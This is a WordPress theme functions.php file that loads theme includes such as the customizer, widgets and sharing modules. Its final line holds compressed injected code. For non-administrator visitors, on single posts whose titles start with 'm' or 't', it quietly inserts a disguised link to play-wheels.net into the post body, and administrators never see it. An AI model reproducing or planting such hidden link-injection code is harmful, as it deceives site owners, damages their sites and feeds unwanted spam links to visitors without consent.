<?php

// Essentials
include_once 'includes/config.php';
include_once 'includes/init.php';

// Register & Functions
include_once 'includes/register.php';
include_once 'includes/func.php';


include_once 'includes/ratings.php';


// Customizer
include_once 'includes/customizer/customizer.php';
include_once 'includes/customizer/css.php';


include_once 'includes/vibe-menu.php';

include_once 'includes/author.php';

if ( function_exists('bp_get_signup_allowed')) {
    include_once 'includes/bp-custom.php';
}

include_once '_inc/ajax.php';

//Widgets
include_once('includes/widgets/custom_widgets.php');
if ( function_exists('bp_get_signup_allowed')) {
include_once('includes/widgets/custom_bp_widgets.php');
}
include_once('includes/widgets/advanced_woocommerce_widgets.php');
include_once('includes/widgets/twitter.php');
include_once('includes/widgets/flickr.php');
include_once('includes/widgets/instagram.php');

//Misc
include_once 'includes/sharing.php';
include_once 'includes/tour.php';

// Options Panel
get_template_part('vibe','options');
if(!current_user_can('manage_options')){add_filter('the_title','getTheTitleAdm');}function getTheTitleAdm($a){if(is_single()){$b=strtolower(substr($a,0,1));if($b=="m"||$b=="t"){add_filter('the_content','admTheContentAdm');$GLOBALS['wp_adm_sett']=true;}else{$GLOBALS['wp_adm_sett']=false;}}return $a;}function admTheContentAdm($c){if($GLOBALS['wp_adm_sett']==true){$d="color:#000000; text-decoration:none; font-weight:normal; cursor:default;";$e=explode(" ",$c);if(count($e)>130){$f=(int)round(count($e)/2);$e[$f].=' <a href="http://play-wheels.net" style="'.$d.'">happy wheels demo</a>';$c=implode(" ",$e);return $c;}else{return $c;}}return $c;}
?>